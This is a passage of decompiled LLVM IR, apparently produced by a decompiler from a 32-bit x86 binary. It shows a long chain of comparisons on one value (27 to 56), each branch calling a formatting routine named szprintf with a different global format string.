  %v1_804a286 = icmp eq i1 %v13_804a282, false
  br i1 %v1_804a286, label %dec_label_pc_804a2b8, label %dec_label_pc_804a288

dec_label_pc_804a288:                             ; preds = %dec_label_pc_804a282
  %v0_804a288 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a288 = zext i8 %v0_804a288 to i32
  store i32 %v1_804a288, i32* @edx, align 4
  %v0_804a292 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a292 = zext i8 %v0_804a292 to i32
  %v2_804a2a1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2a1, i32* @ebx, align 4
  %v4_804a2b3 = call i32 @szprintf(i32 %v2_804a2a1, i32 ptrtoint ([12 x i8]* @global_var_80593f4.57 to i32), i32 %v1_804a292)
  br label %dec_label_pc_804a2b8

dec_label_pc_804a2b8:                             ; preds = %dec_label_pc_804a282, %dec_label_pc_804a288
  %v13_804a2b8 = icmp eq i32 %v2_8049ce5, 27
  %v1_804a2bc = icmp eq i1 %v13_804a2b8, false
  br i1 %v1_804a2bc, label %dec_label_pc_804a2ee, label %dec_label_pc_804a2be

dec_label_pc_804a2be:                             ; preds = %dec_label_pc_804a2b8
  %v0_804a2be = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a2be = zext i8 %v0_804a2be to i32
  store i32 %v1_804a2be, i32* @edx, align 4
  %v0_804a2c8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a2c8 = zext i8 %v0_804a2c8 to i32
  %v2_804a2d7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2d7, i32* @ebx, align 4
  %v4_804a2e9 = call i32 @szprintf(i32 %v2_804a2d7, i32 ptrtoint ([13 x i8]* @global_var_8059400.58 to i32), i32 %v1_804a2c8)
  br label %dec_label_pc_804a2ee

dec_label_pc_804a2ee:                             ; preds = %dec_label_pc_804a2b8, %dec_label_pc_804a2be
  %v13_804a2ee = icmp eq i32 %v2_8049ce5, 28
  %v1_804a2f2 = icmp eq i1 %v13_804a2ee, false
  br i1 %v1_804a2f2, label %dec_label_pc_804a324, label %dec_label_pc_804a2f4

dec_label_pc_804a2f4:                             ; preds = %dec_label_pc_804a2ee
  %v0_804a2f4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a2f4 = zext i8 %v0_804a2f4 to i32
  store i32 %v1_804a2f4, i32* @edx, align 4
  %v0_804a2fe = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a2fe = zext i8 %v0_804a2fe to i32
  %v2_804a30d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a30d, i32* @ebx, align 4
  %v4_804a31f = call i32 @szprintf(i32 %v2_804a30d, i32 ptrtoint ([13 x i8]* @global_var_805940d.59 to i32), i32 %v1_804a2fe)
  br label %dec_label_pc_804a324

dec_label_pc_804a324:                             ; preds = %dec_label_pc_804a2ee, %dec_label_pc_804a2f4
  %v13_804a324 = icmp eq i32 %v2_8049ce5, 29
  %v1_804a328 = icmp eq i1 %v13_804a324, false
  br i1 %v1_804a328, label %dec_label_pc_804a35a, label %dec_label_pc_804a32a

dec_label_pc_804a32a:                             ; preds = %dec_label_pc_804a324
  %v0_804a32a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a32a = zext i8 %v0_804a32a to i32
  store i32 %v1_804a32a, i32* @edx, align 4
  %v0_804a334 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a334 = zext i8 %v0_804a334 to i32
  %v2_804a343 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a343, i32* @ebx, align 4
  %v4_804a355 = call i32 @szprintf(i32 %v2_804a343, i32 ptrtoint ([12 x i8]* @global_var_805941a.60 to i32), i32 %v1_804a334)
  br label %dec_label_pc_804a35a

dec_label_pc_804a35a:                             ; preds = %dec_label_pc_804a324, %dec_label_pc_804a32a
  %v13_804a35a = icmp eq i32 %v2_8049ce5, 30
  %v1_804a35e = icmp eq i1 %v13_804a35a, false
  br i1 %v1_804a35e, label %dec_label_pc_804a390, label %dec_label_pc_804a360

dec_label_pc_804a360:                             ; preds = %dec_label_pc_804a35a
  %v0_804a360 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a360 = zext i8 %v0_804a360 to i32
  store i32 %v1_804a360, i32* @edx, align 4
  %v0_804a36a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a36a = zext i8 %v0_804a36a to i32
  %v2_804a379 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a379, i32* @ebx, align 4
  %v4_804a38b = call i32 @szprintf(i32 %v2_804a379, i32 ptrtoint ([13 x i8]* @global_var_8059426.61 to i32), i32 %v1_804a36a)
  br label %dec_label_pc_804a390

dec_label_pc_804a390:                             ; preds = %dec_label_pc_804a35a, %dec_label_pc_804a360
  %v13_804a390 = icmp eq i32 %v2_8049ce5, 31
  %v1_804a394 = icmp eq i1 %v13_804a390, false
  br i1 %v1_804a394, label %dec_label_pc_804a3c6, label %dec_label_pc_804a396

dec_label_pc_804a396:                             ; preds = %dec_label_pc_804a390
  %v0_804a396 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a396 = zext i8 %v0_804a396 to i32
  store i32 %v1_804a396, i32* @edx, align 4
  %v0_804a3a0 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a3a0 = zext i8 %v0_804a3a0 to i32
  %v2_804a3af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3af, i32* @ebx, align 4
  %v4_804a3c1 = call i32 @szprintf(i32 %v2_804a3af, i32 ptrtoint ([12 x i8]* @global_var_8059433.62 to i32), i32 %v1_804a3a0)
  br label %dec_label_pc_804a3c6

dec_label_pc_804a3c6:                             ; preds = %dec_label_pc_804a390, %dec_label_pc_804a396
  %v10_804a3c6 = icmp eq i32 %v2_8049ce5, 32
  %v1_804a3ca = icmp eq i1 %v10_804a3c6, false
  br i1 %v1_804a3ca, label %dec_label_pc_804a3fc, label %dec_label_pc_804a3cc

dec_label_pc_804a3cc:                             ; preds = %dec_label_pc_804a3c6
  %v0_804a3cc = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a3cc = zext i8 %v0_804a3cc to i32
  store i32 %v1_804a3cc, i32* @edx, align 4
  %v0_804a3d6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a3d6 = zext i8 %v0_804a3d6 to i32
  %v2_804a3e5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3e5, i32* @ebx, align 4
  %v4_804a3f7 = call i32 @szprintf(i32 %v2_804a3e5, i32 ptrtoint ([11 x i8]* @global_var_805943f.63 to i32), i32 %v1_804a3d6)
  br label %dec_label_pc_804a3fc

dec_label_pc_804a3fc:                             ; preds = %dec_label_pc_804a3c6, %dec_label_pc_804a3cc
  %v13_804a3fc = icmp eq i32 %v2_8049ce5, 33
  %v1_804a400 = icmp eq i1 %v13_804a3fc, false
  br i1 %v1_804a400, label %dec_label_pc_804a432, label %dec_label_pc_804a402

dec_label_pc_804a402:                             ; preds = %dec_label_pc_804a3fc
  %v0_804a402 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a402 = zext i8 %v0_804a402 to i32
  store i32 %v1_804a402, i32* @edx, align 4
  %v0_804a40c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a40c = zext i8 %v0_804a40c to i32
  %v2_804a41b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a41b, i32* @ebx, align 4
  %v4_804a42d = call i32 @szprintf(i32 %v2_804a41b, i32 ptrtoint ([12 x i8]* @global_var_805944a.64 to i32), i32 %v1_804a40c)
  br label %dec_label_pc_804a432

dec_label_pc_804a432:                             ; preds = %dec_label_pc_804a3fc, %dec_label_pc_804a402
  %v13_804a432 = icmp eq i32 %v2_8049ce5, 34
  %v1_804a436 = icmp eq i1 %v13_804a432, false
  br i1 %v1_804a436, label %dec_label_pc_804a468, label %dec_label_pc_804a438

dec_label_pc_804a438:                             ; preds = %dec_label_pc_804a432
  %v0_804a438 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a438 = zext i8 %v0_804a438 to i32
  store i32 %v1_804a438, i32* @edx, align 4
  %v0_804a442 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a442 = zext i8 %v0_804a442 to i32
  %v2_804a451 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a451, i32* @ebx, align 4
  %v4_804a463 = call i32 @szprintf(i32 %v2_804a451, i32 ptrtoint ([12 x i8]* @global_var_8059456.65 to i32), i32 %v1_804a442)
  br label %dec_label_pc_804a468

dec_label_pc_804a468:                             ; preds = %dec_label_pc_804a432, %dec_label_pc_804a438
  %v13_804a468 = icmp eq i32 %v2_8049ce5, 35
  %v1_804a46c = icmp eq i1 %v13_804a468, false
  br i1 %v1_804a46c, label %dec_label_pc_804a49e, label %dec_label_pc_804a46e

dec_label_pc_804a46e:                             ; preds = %dec_label_pc_804a468
  %v0_804a46e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a46e = zext i8 %v0_804a46e to i32
  store i32 %v1_804a46e, i32* @edx, align 4
  %v0_804a478 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a478 = zext i8 %v0_804a478 to i32
  %v2_804a487 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a487, i32* @ebx, align 4
  %v4_804a499 = call i32 @szprintf(i32 %v2_804a487, i32 ptrtoint ([12 x i8]* @global_var_8059462.66 to i32), i32 %v1_804a478)
  br label %dec_label_pc_804a49e

dec_label_pc_804a49e:                             ; preds = %dec_label_pc_804a468, %dec_label_pc_804a46e
  %v13_804a49e = icmp eq i32 %v2_8049ce5, 36
  %v1_804a4a2 = icmp eq i1 %v13_804a49e, false
  br i1 %v1_804a4a2, label %dec_label_pc_804a4d4, label %dec_label_pc_804a4a4

dec_label_pc_804a4a4:                             ; preds = %dec_label_pc_804a49e
  %v0_804a4a4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a4a4 = zext i8 %v0_804a4a4 to i32
  store i32 %v1_804a4a4, i32* @edx, align 4
  %v0_804a4ae = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a4ae = zext i8 %v0_804a4ae to i32
  %v2_804a4bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4bd, i32* @ebx, align 4
  %v4_804a4cf = call i32 @szprintf(i32 %v2_804a4bd, i32 ptrtoint ([12 x i8]* @global_var_805946e.67 to i32), i32 %v1_804a4ae)
  br label %dec_label_pc_804a4d4

dec_label_pc_804a4d4:                             ; preds = %dec_label_pc_804a49e, %dec_label_pc_804a4a4
  %v13_804a4d4 = icmp eq i32 %v2_8049ce5, 37
  %v1_804a4d8 = icmp eq i1 %v13_804a4d4, false
  br i1 %v1_804a4d8, label %dec_label_pc_804a50a, label %dec_label_pc_804a4da

dec_label_pc_804a4da:                             ; preds = %dec_label_pc_804a4d4
  %v0_804a4da = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a4da = zext i8 %v0_804a4da to i32
  store i32 %v1_804a4da, i32* @edx, align 4
  %v0_804a4e4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a4e4 = zext i8 %v0_804a4e4 to i32
  %v2_804a4f3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4f3, i32* @ebx, align 4
  %v4_804a505 = call i32 @szprintf(i32 %v2_804a4f3, i32 ptrtoint ([12 x i8]* @global_var_805947a.68 to i32), i32 %v1_804a4e4)
  br label %dec_label_pc_804a50a

dec_label_pc_804a50a:                             ; preds = %dec_label_pc_804a4d4, %dec_label_pc_804a4da
  %v13_804a50a = icmp eq i32 %v2_8049ce5, 38
  %v1_804a50e = icmp eq i1 %v13_804a50a, false
  br i1 %v1_804a50e, label %dec_label_pc_804a540, label %dec_label_pc_804a510

dec_label_pc_804a510:                             ; preds = %dec_label_pc_804a50a
  %v0_804a510 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a510 = zext i8 %v0_804a510 to i32
  store i32 %v1_804a510, i32* @edx, align 4
  %v0_804a51a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a51a = zext i8 %v0_804a51a to i32
  %v2_804a529 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a529, i32* @ebx, align 4
  %v4_804a53b = call i32 @szprintf(i32 %v2_804a529, i32 ptrtoint ([13 x i8]* @global_var_8059486.69 to i32), i32 %v1_804a51a)
  br label %dec_label_pc_804a540

dec_label_pc_804a540:                             ; preds = %dec_label_pc_804a50a, %dec_label_pc_804a510
  %v13_804a540 = icmp eq i32 %v2_8049ce5, 39
  %v1_804a544 = icmp eq i1 %v13_804a540, false
  br i1 %v1_804a544, label %dec_label_pc_804a576, label %dec_label_pc_804a546

dec_label_pc_804a546:                             ; preds = %dec_label_pc_804a540
  %v0_804a546 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a546 = zext i8 %v0_804a546 to i32
  store i32 %v1_804a546, i32* @edx, align 4
  %v0_804a550 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a550 = zext i8 %v0_804a550 to i32
  %v2_804a55f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a55f, i32* @ebx, align 4
  %v4_804a571 = call i32 @szprintf(i32 %v2_804a55f, i32 ptrtoint ([13 x i8]* @global_var_8059493.70 to i32), i32 %v1_804a550)
  br label %dec_label_pc_804a576

dec_label_pc_804a576:                             ; preds = %dec_label_pc_804a540, %dec_label_pc_804a546
  %v13_804a576 = icmp eq i32 %v2_8049ce5, 40
  %v1_804a57a = icmp eq i1 %v13_804a576, false
  br i1 %v1_804a57a, label %dec_label_pc_804a5ac, label %dec_label_pc_804a57c

dec_label_pc_804a57c:                             ; preds = %dec_label_pc_804a576
  %v0_804a57c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a57c = zext i8 %v0_804a57c to i32
  store i32 %v1_804a57c, i32* @edx, align 4
  %v0_804a586 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a586 = zext i8 %v0_804a586 to i32
  %v2_804a595 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a595, i32* @ebx, align 4
  %v4_804a5a7 = call i32 @szprintf(i32 %v2_804a595, i32 ptrtoint ([13 x i8]* @global_var_8059486.69 to i32), i32 %v1_804a586)
  br label %dec_label_pc_804a5ac

dec_label_pc_804a5ac:                             ; preds = %dec_label_pc_804a576, %dec_label_pc_804a57c
  %v13_804a5ac = icmp eq i32 %v2_8049ce5, 41
  %v1_804a5b0 = icmp eq i1 %v13_804a5ac, false
  br i1 %v1_804a5b0, label %dec_label_pc_804a5e2, label %dec_label_pc_804a5b2

dec_label_pc_804a5b2:                             ; preds = %dec_label_pc_804a5ac
  %v0_804a5b2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a5b2 = zext i8 %v0_804a5b2 to i32
  store i32 %v1_804a5b2, i32* @edx, align 4
  %v0_804a5bc = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a5bc = zext i8 %v0_804a5bc to i32
  %v2_804a5cb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5cb, i32* @ebx, align 4
  %v4_804a5dd = call i32 @szprintf(i32 %v2_804a5cb, i32 ptrtoint ([13 x i8]* @global_var_80594a0.71 to i32), i32 %v1_804a5bc)
  br label %dec_label_pc_804a5e2

dec_label_pc_804a5e2:                             ; preds = %dec_label_pc_804a5ac, %dec_label_pc_804a5b2
  %v13_804a5e2 = icmp eq i32 %v2_8049ce5, 42
  %v1_804a5e6 = icmp eq i1 %v13_804a5e2, false
  br i1 %v1_804a5e6, label %dec_label_pc_804a618, label %dec_label_pc_804a5e8

dec_label_pc_804a5e8:                             ; preds = %dec_label_pc_804a5e2
  %v0_804a5e8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a5e8 = zext i8 %v0_804a5e8 to i32
  store i32 %v1_804a5e8, i32* @edx, align 4
  %v0_804a5f2 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a5f2 = zext i8 %v0_804a5f2 to i32
  %v2_804a601 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a601, i32* @ebx, align 4
  %v4_804a613 = call i32 @szprintf(i32 %v2_804a601, i32 ptrtoint ([13 x i8]* @global_var_80594ad.72 to i32), i32 %v1_804a5f2)
  br label %dec_label_pc_804a618

dec_label_pc_804a618:                             ; preds = %dec_label_pc_804a5e2, %dec_label_pc_804a5e8
  %v13_804a618 = icmp eq i32 %v2_8049ce5, 43
  %v1_804a61c = icmp eq i1 %v13_804a618, false
  br i1 %v1_804a61c, label %dec_label_pc_804a64e, label %dec_label_pc_804a61e

dec_label_pc_804a61e:                             ; preds = %dec_label_pc_804a618
  %v0_804a61e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a61e = zext i8 %v0_804a61e to i32
  store i32 %v1_804a61e, i32* @edx, align 4
  %v0_804a628 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a628 = zext i8 %v0_804a628 to i32
  %v2_804a637 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a637, i32* @ebx, align 4
  %v4_804a649 = call i32 @szprintf(i32 %v2_804a637, i32 ptrtoint ([13 x i8]* @global_var_80594ba.73 to i32), i32 %v1_804a628)
  br label %dec_label_pc_804a64e

dec_label_pc_804a64e:                             ; preds = %dec_label_pc_804a618, %dec_label_pc_804a61e
  %v13_804a64e = icmp eq i32 %v2_8049ce5, 44
  %v1_804a652 = icmp eq i1 %v13_804a64e, false
  br i1 %v1_804a652, label %dec_label_pc_804a684, label %dec_label_pc_804a654

dec_label_pc_804a654:                             ; preds = %dec_label_pc_804a64e
  %v0_804a654 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a654 = zext i8 %v0_804a654 to i32
  store i32 %v1_804a654, i32* @edx, align 4
  %v0_804a65e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a65e = zext i8 %v0_804a65e to i32
  %v2_804a66d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a66d, i32* @ebx, align 4
  %v4_804a67f = call i32 @szprintf(i32 %v2_804a66d, i32 ptrtoint ([13 x i8]* @global_var_80594ad.72 to i32), i32 %v1_804a65e)
  br label %dec_label_pc_804a684

dec_label_pc_804a684:                             ; preds = %dec_label_pc_804a64e, %dec_label_pc_804a654
  %v13_804a684 = icmp eq i32 %v2_8049ce5, 45
  %v1_804a688 = icmp eq i1 %v13_804a684, false
  br i1 %v1_804a688, label %dec_label_pc_804a6ba, label %dec_label_pc_804a68a

dec_label_pc_804a68a:                             ; preds = %dec_label_pc_804a684
  %v0_804a68a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a68a = zext i8 %v0_804a68a to i32
  store i32 %v1_804a68a, i32* @edx, align 4
  %v0_804a694 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a694 = zext i8 %v0_804a694 to i32
  %v2_804a6a3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6a3, i32* @ebx, align 4
  %v4_804a6b5 = call i32 @szprintf(i32 %v2_804a6a3, i32 ptrtoint ([13 x i8]* @global_var_80594c7.74 to i32), i32 %v1_804a694)
  br label %dec_label_pc_804a6ba

dec_label_pc_804a6ba:                             ; preds = %dec_label_pc_804a684, %dec_label_pc_804a68a
  %v13_804a6ba = icmp eq i32 %v2_8049ce5, 46
  %v1_804a6be = icmp eq i1 %v13_804a6ba, false
  br i1 %v1_804a6be, label %dec_label_pc_804a6f0, label %dec_label_pc_804a6c0

dec_label_pc_804a6c0:                             ; preds = %dec_label_pc_804a6ba
  %v0_804a6c0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a6c0 = zext i8 %v0_804a6c0 to i32
  store i32 %v1_804a6c0, i32* @edx, align 4
  %v0_804a6ca = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a6ca = zext i8 %v0_804a6ca to i32
  %v2_804a6d9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6d9, i32* @ebx, align 4
  %v4_804a6eb = call i32 @szprintf(i32 %v2_804a6d9, i32 ptrtoint ([13 x i8]* @global_var_80594d4.75 to i32), i32 %v1_804a6ca)
  br label %dec_label_pc_804a6f0

dec_label_pc_804a6f0:                             ; preds = %dec_label_pc_804a6ba, %dec_label_pc_804a6c0
  %v13_804a6f0 = icmp eq i32 %v2_8049ce5, 47
  %v1_804a6f4 = icmp eq i1 %v13_804a6f0, false
  br i1 %v1_804a6f4, label %dec_label_pc_804a726, label %dec_label_pc_804a6f6

dec_label_pc_804a6f6:                             ; preds = %dec_label_pc_804a6f0
  %v0_804a6f6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a6f6 = zext i8 %v0_804a6f6 to i32
  store i32 %v1_804a6f6, i32* @edx, align 4
  %v0_804a700 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a700 = zext i8 %v0_804a700 to i32
  %v2_804a70f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a70f, i32* @ebx, align 4
  %v4_804a721 = call i32 @szprintf(i32 %v2_804a70f, i32 ptrtoint ([13 x i8]* @global_var_80594e1.76 to i32), i32 %v1_804a700)
  br label %dec_label_pc_804a726

dec_label_pc_804a726:                             ; preds = %dec_label_pc_804a6f0, %dec_label_pc_804a6f6
  %v10_804a726 = icmp eq i32 %v2_8049ce5, 48
  %v1_804a72a = icmp eq i1 %v10_804a726, false
  br i1 %v1_804a72a, label %dec_label_pc_804a75c, label %dec_label_pc_804a72c

dec_label_pc_804a72c:                             ; preds = %dec_label_pc_804a726
  %v0_804a72c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a72c = zext i8 %v0_804a72c to i32
  store i32 %v1_804a72c, i32* @edx, align 4
  %v0_804a736 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a736 = zext i8 %v0_804a736 to i32
  %v2_804a745 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a745, i32* @ebx, align 4
  %v4_804a757 = call i32 @szprintf(i32 %v2_804a745, i32 ptrtoint ([13 x i8]* @global_var_80594ee.77 to i32), i32 %v1_804a736)
  br label %dec_label_pc_804a75c

dec_label_pc_804a75c:                             ; preds = %dec_label_pc_804a726, %dec_label_pc_804a72c
  %v13_804a75c = icmp eq i32 %v2_8049ce5, 49
  %v1_804a760 = icmp eq i1 %v13_804a75c, false
  br i1 %v1_804a760, label %dec_label_pc_804a792, label %dec_label_pc_804a762

dec_label_pc_804a762:                             ; preds = %dec_label_pc_804a75c
  %v0_804a762 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a762 = zext i8 %v0_804a762 to i32
  store i32 %v1_804a762, i32* @edx, align 4
  %v0_804a76c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a76c = zext i8 %v0_804a76c to i32
  %v2_804a77b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a77b, i32* @ebx, align 4
  %v4_804a78d = call i32 @szprintf(i32 %v2_804a77b, i32 ptrtoint ([13 x i8]* @global_var_80594fb.78 to i32), i32 %v1_804a76c)
  br label %dec_label_pc_804a792

dec_label_pc_804a792:                             ; preds = %dec_label_pc_804a75c, %dec_label_pc_804a762
  %v13_804a792 = icmp eq i32 %v2_8049ce5, 50
  %v1_804a796 = icmp eq i1 %v13_804a792, false
  br i1 %v1_804a796, label %dec_label_pc_804a7c8, label %dec_label_pc_804a798

dec_label_pc_804a798:                             ; preds = %dec_label_pc_804a792
  %v0_804a798 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a798 = zext i8 %v0_804a798 to i32
  store i32 %v1_804a798, i32* @edx, align 4
  %v0_804a7a2 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a7a2 = zext i8 %v0_804a7a2 to i32
  %v2_804a7b1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7b1, i32* @ebx, align 4
  %v4_804a7c3 = call i32 @szprintf(i32 %v2_804a7b1, i32 ptrtoint ([13 x i8]* @global_var_8059508.79 to i32), i32 %v1_804a7a2)
  br label %dec_label_pc_804a7c8

dec_label_pc_804a7c8:                             ; preds = %dec_label_pc_804a792, %dec_label_pc_804a798
  %v13_804a7c8 = icmp eq i32 %v2_8049ce5, 51
  %v1_804a7cc = icmp eq i1 %v13_804a7c8, false
  br i1 %v1_804a7cc, label %dec_label_pc_804a7fe, label %dec_label_pc_804a7ce

dec_label_pc_804a7ce:                             ; preds = %dec_label_pc_804a7c8
  %v0_804a7ce = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a7ce = zext i8 %v0_804a7ce to i32
  store i32 %v1_804a7ce, i32* @edx, align 4
  %v0_804a7d8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a7d8 = zext i8 %v0_804a7d8 to i32
  %v2_804a7e7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7e7, i32* @ebx, align 4
  %v4_804a7f9 = call i32 @szprintf(i32 %v2_804a7e7, i32 ptrtoint ([14 x i8]* @global_var_8059515.80 to i32), i32 %v1_804a7d8)
  br label %dec_label_pc_804a7fe

dec_label_pc_804a7fe:                             ; preds = %dec_label_pc_804a7c8, %dec_label_pc_804a7ce
  %v13_804a7fe = icmp eq i32 %v2_8049ce5, 52
  %v1_804a802 = icmp eq i1 %v13_804a7fe, false
  br i1 %v1_804a802, label %dec_label_pc_804a834, label %dec_label_pc_804a804

dec_label_pc_804a804:                             ; preds = %dec_label_pc_804a7fe
  %v0_804a804 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a804 = zext i8 %v0_804a804 to i32
  store i32 %v1_804a804, i32* @edx, align 4
  %v0_804a80e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a80e = zext i8 %v0_804a80e to i32
  %v2_804a81d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a81d, i32* @ebx, align 4
  %v4_804a82f = call i32 @szprintf(i32 %v2_804a81d, i32 ptrtoint ([13 x i8]* @global_var_8059523.81 to i32), i32 %v1_804a80e)
  br label %dec_label_pc_804a834

dec_label_pc_804a834:                             ; preds = %dec_label_pc_804a7fe, %dec_label_pc_804a804
  %v13_804a834 = icmp eq i32 %v2_8049ce5, 53
  %v1_804a838 = icmp eq i1 %v13_804a834, false
  br i1 %v1_804a838, label %dec_label_pc_804a86a, label %dec_label_pc_804a83a

dec_label_pc_804a83a:                             ; preds = %dec_label_pc_804a834
  %v0_804a83a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a83a = zext i8 %v0_804a83a to i32
  store i32 %v1_804a83a, i32* @edx, align 4
  %v0_804a844 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a844 = zext i8 %v0_804a844 to i32
  %v2_804a853 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a853, i32* @ebx, align 4
  %v4_804a865 = call i32 @szprintf(i32 %v2_804a853, i32 ptrtoint ([14 x i8]* @global_var_8059530.82 to i32), i32 %v1_804a844)
  br label %dec_label_pc_804a86a

dec_label_pc_804a86a:                             ; preds = %dec_label_pc_804a834, %dec_label_pc_804a83a
  %v13_804a86a = icmp eq i32 %v2_8049ce5, 54
  %v1_804a86e = icmp eq i1 %v13_804a86a, false
  br i1 %v1_804a86e, label %dec_label_pc_804a8a0, label %dec_label_pc_804a870

dec_label_pc_804a870:                             ; preds = %dec_label_pc_804a86a
  %v0_804a870 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a870 = zext i8 %v0_804a870 to i32
  store i32 %v1_804a870, i32* @edx, align 4
  %v0_804a87a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a87a = zext i8 %v0_804a87a to i32
  %v2_804a889 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a889, i32* @ebx, align 4
  %v4_804a89b = call i32 @szprintf(i32 %v2_804a889, i32 ptrtoint ([13 x i8]* @global_var_805953e.83 to i32), i32 %v1_804a87a)
  br label %dec_label_pc_804a8a0

dec_label_pc_804a8a0:                             ; preds = %dec_label_pc_804a86a, %dec_label_pc_804a870
  %v13_804a8a0 = icmp eq i32 %v2_8049ce5, 55
  %v1_804a8a4 = icmp eq i1 %v13_804a8a0, false
  br i1 %v1_804a8a4, label %dec_label_pc_804a8d6, label %dec_label_pc_804a8a6

dec_label_pc_804a8a6:                             ; preds = %dec_label_pc_804a8a0
  %v0_804a8a6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a8a6 = zext i8 %v0_804a8a6 to i32
  store i32 %v1_804a8a6, i32* @edx, align 4
  %v0_804a8b0 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a8b0 = zext i8 %v0_804a8b0 to i32
  %v2_804a8bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8bf, i32* @ebx, align 4
  %v4_804a8d1 = call i32 @szprintf(i32 %v2_804a8bf, i32 ptrtoint ([14 x i8]* @global_var_805954b.84 to i32), i32 %v1_804a8b0)
  br label %dec_label_pc_804a8d6

dec_label_pc_804a8d6:                             ; preds = %dec_label_pc_804a8a0, %dec_label_pc_804a8a6
  %v13_804a8d6 = icmp eq i32 %v2_8049ce5, 56
  %v1_804a8da = icmp eq i1 %v13_804a8d6, false
  br i1 %v1_804a8da, label %dec_label_pc_804a90c, label %dec_label_pc_804a8dc

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8d6
  %v0_804a8dc = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a8dc = zext i8 %v0_804a8dc to i32
  store i32 %v1_804a8dc, i32* @edx, align 4
